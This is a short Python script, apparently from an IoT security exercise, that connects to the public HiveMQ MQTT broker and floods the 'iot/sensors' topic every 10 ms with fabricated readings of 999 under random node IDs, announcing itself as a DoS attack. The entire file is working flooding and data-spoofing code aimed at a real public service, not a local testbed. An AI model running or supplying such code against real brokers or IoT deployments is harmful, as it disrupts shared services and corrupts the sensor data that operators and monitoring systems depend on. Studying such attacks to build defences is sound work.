import paho.mqtt.client as mqtt
import json
import random
import time

client = mqtt.Client()
client.connect("broker.hivemq.com", 1883)

print("🚨 Starting DoS attack: flooding topic with fake data...")

while True:
    payload = {
        "node_id": f"Node-{random.randint(1, 25)}",
        "Temperature": 999,
        "Humidity": 999,
        "Pressure": 999,
        "timestamp": time.time()
    }
    client.publish("iot/sensors", json.dumps(payload))
    print("⚠️ Flooded:", payload)
    time.sleep(0.01)  # Rapid flood
